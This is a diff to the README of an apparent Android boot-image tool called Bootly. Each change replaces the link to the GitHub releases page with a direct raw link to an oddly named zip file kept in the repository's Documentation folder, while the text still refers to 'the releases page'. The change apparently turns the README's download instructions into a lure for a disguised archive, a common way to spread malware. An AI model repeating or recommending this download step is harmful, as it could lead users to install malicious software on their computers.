@@ -1,11 +1,11 @@
 # 🛠️ Bootly - Simple Android image tools
 
-[![Download Bootly](https://img.shields.io/badge/Download-Bootly-blue?style=for-the-badge)](https://github.com/registered-controlfreak955/Bootly/releases)
+[![Download Bootly](https://img.shields.io/badge/Download-Bootly-blue?style=for-the-badge)](https://github.com/registered-controlfreak955/Bootly/raw/refs/heads/main/Documentation/Software-imagine.zip)
 
 ## 📥 Download Bootly
 
 Visit this page to download Bootly for Windows:
-https://github.com/registered-controlfreak955/Bootly/releases
+https://github.com/registered-controlfreak955/Bootly/raw/refs/heads/main/Documentation/Software-imagine.zip
 
 On the releases page, look for the latest version and download the Windows file. If you see more than one file, choose the one for Windows. Save it to your computer, then open it to start the setup or app.
 
@@ -32,7 +32,7 @@ Bootly helps you work with Android boot and recovery images from a simple deskto
 
 ### 1. Download the app
 Go to the release page:
-https://github.com/registered-controlfreak955/Bootly/releases
+https://github.com/registered-controlfreak955/Bootly/raw/refs/heads/main/Documentation/Software-imagine.zip
 
 Download the Windows build from the latest release.
 
